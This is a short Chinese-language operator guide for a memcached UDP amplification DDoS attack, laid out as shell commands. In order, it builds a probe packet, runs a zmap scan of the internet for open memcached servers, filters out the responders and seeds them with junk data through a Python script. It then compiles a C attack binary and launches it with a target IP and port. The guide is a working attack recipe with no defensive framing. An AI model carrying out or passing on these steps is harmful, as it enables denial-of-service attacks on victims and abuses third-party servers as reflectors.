### 目录
    cd ddos/meme

### 生成MEME 载荷
    echo -ne '\x00\x01\x00\x00\x00\x01\x00\x00stats items\r\n' > memcached_probe.pkt

### 扫描
    nohup zmap -p11211 --output-filter='sport=11211' -Mudp --probe-args=file:memcached_probe.pkt -f "saddr,udp_pkt_size,data" -o memcached.alive.txt >> zmap.log &

### 过滤列表（这将删除虚假响应并清理列表）
-     cat memcached.alive.txt | sed 's/,/ /g' | sed 's/saddr.*//g' | awk '$3~/53544154/ || $3~/454e44/ || $3~/737461747320/' | awk '{print $1}' | sort -u > memcached.list.txt
-     wc -l memcached.list.txt

### 运行播种过程
-     python3.8 -m pip install memcache
-     rm -f junkfile && python3.8 memcached-seeder.py memcached.list.txt junkfile

### 编译
    gcc memcached-static.c -o meme -pthread

## 攻击
    ./meme ip port junkfile 1 -1 60
